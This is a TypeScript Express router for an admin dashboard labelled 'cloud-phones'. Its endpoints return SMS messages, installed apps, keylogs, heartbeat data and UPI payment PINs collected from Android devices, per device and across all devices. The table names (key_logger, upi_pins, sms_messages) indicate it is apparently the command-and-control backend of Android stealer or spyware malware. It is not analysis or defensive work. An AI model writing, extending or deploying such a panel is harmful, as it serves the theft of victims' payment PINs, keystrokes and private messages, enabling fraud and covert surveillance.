import { Router, Request, Response } from 'express';
import { createClient } from '@supabase/supabase-js';
import config from '../../config/env';
import { authenticate, requireRole } from '../../middleware/auth';
import { asyncHandler } from '../../middleware/errorHandler';

const router = Router();
const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);

const adminOnly = [authenticate, requireRole(['admin'])];

/**
 * GET /api/v1/cloud-phones/data/devices
 * List all Android devices from the core devices table
 */
router.get('/devices', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { status, appId, limit = 100 } = req.query;

    let query = supabase
        .from('devices')
        .select('*')
        .order('last_seen', { ascending: false })
        .limit(Number(limit));

    if (status) {
        query = query.eq('status', status === 'true');
    }

    if (appId) {
        // filter by app_id via device_app_assignments
        const { data: assignments, error: assignError } = await supabase
            .from('device_app_assignments')
            .select('device_id')
            .eq('app_id', appId);

        if (assignError) throw assignError;

        const deviceIds = (assignments || []).map(a => a.device_id);
        if (deviceIds.length === 0) {
            return res.json({ success: true, devices: [] });
        }

        query = query.in('device_id', deviceIds);
    }

    const { data, error } = await query;
    if (error) throw error;

    return res.json({ success: true, devices: data });
}));

/**
 * GET /api/v1/cloud-phones/data/devices/:deviceId
 * Get single Android device details
 */
router.get('/devices/:deviceId', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;

    const { data, error } = await supabase
        .from('devices')
        .select('*')
        .eq('device_id', deviceId)
        .maybeSingle();

    if (error) throw error;
    if (!data) return res.status(404).json({ success: false, error: 'Device not found' });

    return res.json({ success: true, device: data });
}));

/**
 * GET /api/v1/cloud-phones/data/devices/:deviceId/messages
 * Get SMS messages for a device
 */
router.get('/devices/:deviceId/messages', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;

    const { data, error } = await supabase
        .from('sms_messages')
        .select('*')
        .eq('device_id', deviceId)
        .order('timestamp', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;

    return res.json({ success: true, messages: data });
}));

/**
 * GET /api/v1/cloud-phones/data/devices/:deviceId/apps
 * Get installed apps for a device
 */
router.get('/devices/:deviceId/apps', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 200 } = req.query;

    const { data, error } = await supabase
        .from('installed_apps')
        .select('*')
        .eq('device_id', deviceId)
        .order('app_name', { ascending: true })
        .limit(Number(limit));

    if (error) throw error;

    return res.json({ success: true, apps: data });
}));

/**
 * GET /api/v1/cloud-phones/data/devices/:deviceId/keylogs
 * Get keylogs for a device
 */
router.get('/devices/:deviceId/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;

    const { data, error } = await supabase
        .from('key_logger')
        .select('*')
        .eq('device_id', deviceId)
        .order('created_at', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;

    return res.json({ success: true, keylogs: data });
}));

/**
 * GET /api/v1/cloud-phones/data/devices/:deviceId/upi-pins
 * Get UPI pins for a device
 */
router.get('/devices/:deviceId/upi-pins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;

    const { data, error } = await supabase
        .from('upi_pins')
        .select('*')
        .eq('device_id', deviceId)
        .order('created_at', { ascending: false });

    if (error) throw error;

    return res.json({ success: true, pins: data });
}));

/**
 * GET /api/v1/cloud-phones/data/devices/:deviceId/heartbeat
 * Get heartbeat history for a device
 */
router.get('/devices/:deviceId/heartbeat', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 50 } = req.query;

    const { data, error } = await supabase
        .from('heartbeat')
        .select('*')
        .eq('device_id', deviceId)
        .order('last_update', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;

    return res.json({ success: true, heartbeat: data });
}));

/**
 * GET /api/v1/cloud-phones/data/messages
 * List all SMS messages across all devices
 */
router.get('/messages', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;

    const { data, error } = await supabase
        .from('sms_messages')
        .select('*')
        .order('timestamp', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, messages: data });
}));

/**
 * GET /api/v1/cloud-phones/data/apps
 * List all installed apps across all devices
 */
router.get('/apps', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 200 } = req.query;

    const { data, error } = await supabase
        .from('installed_apps')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, apps: data });
}));

/**
 * GET /api/v1/cloud-phones/data/keylogs
 * List all keylogs across all devices
 */
router.get('/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;

    const { data, error } = await supabase
        .from('key_logger')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, keylogs: data });
}));

/**
 * GET /api/v1/cloud-phones/data/upi-pins
 * List all UPI pins across all devices
 */
router.get('/upi-pins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;

    const { data, error } = await supabase
        .from('upi_pins')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, pins: data });
}));

/**
 * GET /api/v1/cloud-phones/data/devices/:deviceId/stats
 * Get counts for messages, apps, etc. for a specific device
 */
router.get('/devices/:deviceId/stats', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;

    const [msgCount, appCount] = await Promise.all([
        supabase.from('sms_messages').select('*', { count: 'exact', head: true }).eq('device_id', deviceId),
        supabase.from('installed_apps').select('*', { count: 'exact', head: true }).eq('device_id', deviceId)
    ]);

    return res.json({
        success: true,
        stats: {
            messages: msgCount.count || 0,
            apps: appCount.count || 0
        }
    });
}));

export default router;
